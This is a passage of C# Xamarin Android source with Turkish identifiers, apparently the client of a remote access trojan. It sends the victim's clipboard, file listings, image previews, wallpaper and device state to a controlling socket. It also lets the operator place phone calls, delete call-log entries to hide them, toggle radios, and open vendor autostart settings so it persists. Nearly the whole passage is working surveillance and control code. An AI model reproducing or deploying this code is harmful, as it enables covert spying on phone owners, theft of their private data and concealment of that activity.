                    Soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
            else
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]CIHAZ[VERI]" + "BOS"));
                    Soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        public void dosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_.ToList())
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]SDCARD[VERI]" + dosyalarS));
                    Soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
            else
            {
                try
                {
                    byte[] senddata = MyDataPacker("FILES", System.Text.Encoding.UTF8.GetBytes("[VERI]SDCARD[VERI]" + "BOS"));
                    Soketimiz.BeginSend(senddata, 0, senddata.Length, SocketFlags.None, null, null);
                }
                catch (Exception) { }
            }
        }
        public string usbDurumu()
        {
            string status = "";
            try
            {
                var source = Battery.PowerSource;
                switch (source)
                {
                    case BatteryPowerSource.Battery:
                        status = "BATTERY";
                        break;
                    case BatteryPowerSource.AC:
                        status = "PLUG";
                        break;
                    case BatteryPowerSource.Usb:
                        status = "USB";
                        break;
                    case BatteryPowerSource.Wireless:
                        status = "WIRELESS";
                        break;
                    case BatteryPowerSource.Unknown:
                        status = "UNKNOWN";
                        break;
                }
                return status + "[VERI]";
            }
            catch (Exception ex) { status = ex.Message + "[VERI]"; return status; }
        }
        public string wifi_durumu()
        {
            try
            {
                WifiManager wifiManager = (WifiManager)(Application.Context.GetSystemService(WifiService));
                if (wifiManager != null)
                {
                    return wifiManager.ConnectionInfo.SSID;
                }
                else
                {
                    return "Wifi not connected.";
                }
            }
            catch (Exception) { return "Wifi not connected."; }
        }

        private void btKapaAc(bool ac_kapa)
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                if (ac_kapa == false)
                {
                    if (mBluetoothAdapter.IsEnabled)
                    {
                        mBluetoothAdapter.Disable();
                    }
                }
                else
                {
                    if (ac_kapa == true)
                    {
                        if (mBluetoothAdapter.IsEnabled == false)
                        {
                            mBluetoothAdapter.Enable();
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        public void wifiAcKapa(bool acKapa)
        {
            try
            {
                WifiManager wifi = (WifiManager)GetSystemService(WifiService);
                wifi.SetWifiEnabled(acKapa);
            }
            catch (Exception) { }
        }
        public void setBrightness(int brightness)
        {
            if (brightness < 0)
                brightness = 0;
            else if (brightness > 255)
                brightness = 255;
            try
            {
                Settings.System.PutInt(ContentResolver,
                        Settings.System.ScreenBrightnessMode,
                       (int)ScreenBrightness.ModeManual);
            }
            catch (Exception) { }
            ContentResolver cResolver = ContentResolver;
            Settings.System.PutInt(cResolver, Settings.System.ScreenBrightness, brightness);

        }
        public string mobil_Veri()
        {
            try
            {
                Android.Net.ConnectivityManager conMan = (Android.Net.ConnectivityManager)
                    GetSystemService(ConnectivityService);
                //mobile
                var mobile = conMan.GetNetworkInfo(Android.Net.ConnectivityType.Mobile).GetState();

                bool mobileYN = false;
                Context context = this;

                if (Build.VERSION.SdkInt >= BuildVersionCodes.JellyBeanMr1)
                {
                    mobileYN = Settings.Global.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                else
                {
                    mobileYN = Settings.Secure.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                return mobileYN ? "Opened/" + ((mobile == Android.Net.NetworkInfo.State.Connected) ? "Internet" : "No Internet") : "Closed";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string gps_durum()
        {
            LocationManager locationManager = (LocationManager)GetSystemService(LocationService);
            if (locationManager.IsProviderEnabled(LocationManager.GpsProvider))
            {
                return "GPS turned on.";
            }
            else
            {
                return "GPS turned off.";
            }
        }
        private string btisEnabled()
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                return mBluetoothAdapter.IsEnabled ? "Turned on" : "Turned off";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string ekranDurumu()
        {
            try
            {
                string KEY_DURUMU = "";
                string EKRAN_DURUMU = "";
                KeyguardManager myKM = (KeyguardManager)GetSystemService(KeyguardService);
                bool isPhoneLocked = myKM.InKeyguardRestrictedInputMode();
                bool isScreenAwake = default;
                KEY_DURUMU = (isPhoneLocked) ? "LOCKED" : "UNLOCKED";
                PowerManager powerManager = (PowerManager)GetSystemService(PowerService);
                isScreenAwake = (int)Build.VERSION.SdkInt < 20 ? powerManager.IsScreenOn : powerManager.IsInteractive;
                EKRAN_DURUMU = isScreenAwake ? "SCREEN ON" : "SCREEN OFF";

                return KEY_DURUMU + "&" + EKRAN_DURUMU + "&";
            }
            catch (Exception ex) { return ex.Message + "&"; }

        }
        public async void panoAyarla(string input)
        {
            await Clipboard.SetTextAsync(input);
        }
        public async void panoyuYolla()
        {
            var pano = await Clipboard.GetTextAsync();
            if (string.IsNullOrEmpty(pano)) { pano = "[NULL]"; }
            try
            {
                byte[] dataPacker = MyDataPacker("PANOGELDI", System.Text.Encoding.UTF8.GetBytes(pano));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }
        public async Task<byte[]> wallPaper(string linq)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    return await wc.DownloadDataTaskAsync(linq);
                }
            }
            catch (Exception)
            {

                return new byte[] { };
            }
        }
        public async void duvarKagidi(string yol)
        {

            try
            {
                byte[] uzant = await wallPaper(yol);
                if (uzant.Length > 0)
                {
                    Android.Graphics.Bitmap bitmap = Android.Graphics.BitmapFactory.DecodeByteArray(uzant, 0, uzant.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception)
            { }

        }

        public byte[] ResizeImage(byte[] imageData, float width, float height)
        {
            try
            {
                // Load the bitmap 
                BitmapFactory.Options options = new BitmapFactory.Options();// Create object of bitmapfactory's option method for further option use
                options.InPurgeable = true; // inPurgeable is used to free up memory while required
                Bitmap originalImage = BitmapFactory.DecodeByteArray(imageData, 0, imageData.Length, options);
                float newHeight = 0;
                float newWidth = 0;
                var originalHeight = originalImage.Height;
                var originalWidth = originalImage.Width;
                if (originalHeight > originalWidth)
                {
                    newHeight = height;
                    float ratio = originalHeight / height;
                    newWidth = originalWidth / ratio;
                }
                else
                {
                    newWidth = width;
                    float ratio = originalWidth / width;
                    newHeight = originalHeight / ratio;
                }
                Bitmap resizedImage = Bitmap.CreateScaledBitmap(originalImage, (int)newWidth, (int)newHeight, true);
                originalImage.Recycle();
                using (MemoryStream ms = new MemoryStream())
                {
                    resizedImage.Compress(Bitmap.CompressFormat.Png, 75, ms);
                    resizedImage.Recycle();
                    return ms.ToArray();
                }
            }
            catch (Exception)
            {
                return default;
            }
        }
        public void preview(string resim)
        {
            try
            {
                Java.IO.File file = new Java.IO.File(resim);
                file.SetReadable(true);
                byte[] bit = ResizeImage(File.ReadAllBytes(resim), 150, 150);
                if (bit.Length > 0)
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("PREVIEW", bit);
                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                    //soketimizeGonder("PREVIEW", "[VERI]" + Convert.ToBase64String(bit) + "[VERI][0x09]");
                }
            }
            catch (Exception) { }
        }
        public byte[] drawableToByteArray(Drawable d)
        {
            var image = d;
            Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
            byte[] bitmapData;
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 20, ms);
                bitmapData = ms.ToArray();
            }
            return bitmapData;
        }
        public void duvarKagidiniGonder()
        {
            DisplayInfo mainDisplayInfo = DeviceDisplay.MainDisplayInfo;
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            if (manager != null)
            {
                try
                {
                    var image = manager.Drawable;
                    if (image != null)
                    {
                        Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                        byte[] bitmapData = default;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 50, ms);
                            bitmapData = ms.ToArray();
                        }
                        string resolution = mainDisplayInfo.Width + " x " + mainDisplayInfo.Height;

                        try
                        {
                            byte[] dataPacker = MyDataPacker("WALLPAPERBYTES", bitmapData, resolution);
                            Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                    else
                    {
                        try
                        {
                            byte[] dataPacker = MyDataPacker("WALLERROR", System.Text.Encoding.UTF8.GetBytes("There is no wallpaper has been set."));
                            Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                        }
                        catch (Exception) { }
                    }
                }
                catch (Exception ex)
                {
                    try
                    {
                        byte[] dataPacker = MyDataPacker("WALLERROR", System.Text.Encoding.UTF8.GetBytes(ex.Message));
                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
            }
        }
        public string wallpaper()
        {
            DisplayInfo mainDisplayInfo = DeviceDisplay.MainDisplayInfo;
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            if (manager != null)
            {
                try
                {
                    var image = manager.Drawable;
                    if (image != null)
                    {
                        Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                        byte[] bitmapData = default;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 50, ms);
                            bitmapData = ms.ToArray();
                        }
                        return Convert.ToBase64String(bitmapData);
                    }
                    else
                    {
                        return "null";
                    }
                }
                catch (Exception)
                {
                    return "null";
                }
            }
            return "null";
        }
        public async void flashIsik(string ne_yapam)
        {
            try
            {
                switch (ne_yapam)
                {
                    case "AC":
                        await Flashlight.TurnOnAsync();
                        break;
                    case "KAPA":
                        await Flashlight.TurnOffAsync();
                        break;
                }
            }
            catch (Exception) { }
        }
        public void MakePhoneCall(string number)
        {
            try
            {
                var uri = Android.Net.Uri.Parse("tel:" + number);
                Intent intent = new Intent(Intent.ActionCall, uri);
                intent.AddFlags(ActivityFlags.NewTask);
                Application.Context.StartActivity(intent);
            }
            catch (Exception) { }
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception)
            {
            }
        }
        protected MediaPlayer player = new MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                if (player == null)
                {
                    player = new MediaPlayer();
                }
                else
                {
                    Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
                    player.Reset();
                    player.SetDataSource(this, uri);
                    player.Prepare();
                    player.Start();
                }
            }
            catch (Exception) { }
        }
        string log_dosylari_gonder = "";
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "";
            string MEDYA_SESI = "";
            string BILDIRIM_SESI = "";
            mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
            //Zil sesi
            int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
            int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
            ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
            //Medya
            int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
            int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
            MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
            //Bildirim Sesi
            int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
            int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
            BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();
            //Ekran Parlaklığı
            int parlaklik = Settings.System.GetInt(ContentResolver,
            Settings.System.ScreenBrightness, 0);

            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=" + parlaklik.ToString() + "=";
            try
            {
                byte[] dataPacker = MyDataPacker("SESBILGILERI", System.Text.Encoding.UTF8.GetBytes(gonderilecekler));
                Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
            }
            catch (Exception) { }
        }
        public void openAutostartSettings(Context kontext)
        {
            Intent intent = new Intent();
            string manufacturer = Build.Manufacturer;
            try
            {
                if (manufacturer.ToLower().Contains("xiaomi"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.permcenter.autostart.AutoStartManagementActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("oppo"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("vivo"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("letv"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.letv.android.letvsafe",
                "com.letv.android.letvsafe.AutobootManageActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("honor"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.huawei.systemmanager",
                "com.huawei.systemmanager.optimize.process.ProtectActivity"
                    ));
                }
                else if (manufacturer.ToLower().Contains("huawe"))
                {
                    intent.SetComponent(new ComponentName(
                        "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                    ));
                }
                else
                {
                    //Debug.WriteLine("Auto-start permission not necessary")
                }
                var list = kontext.PackageManager
                    .QueryIntentActivities(intent, PackageInfoFlags.MatchDefaultOnly);
                if (list.Count > 0)
                {
                    intent.SetFlags(ActivityFlags.NewTask);
                    kontext.StartActivity(intent);
                }
            }
            catch (Exception)
            {
                try
                {
                    if (manufacturer.ToLower().Contains("huawe"))
                    {
                        intent.SetComponent(new ComponentName(
                            "com.huawei.systemmanager",
                        "com.huawei.systemmanager.optimize.bootstart.BootStartActivity"
                        ));
                    }
                    var list = kontext.PackageManager
                        .QueryIntentActivities(intent, PackageInfoFlags.MatchDefaultOnly);
                    if (list.Count > 0)
                    {
                        intent.SetFlags(ActivityFlags.NewTask);
                        kontext.StartActivity(intent);
                    }
                }
                catch (Exception) { }
            }

        }
        public static Activity global_activity = default;
        public static PackageManager global_packageManager = default;
    }
}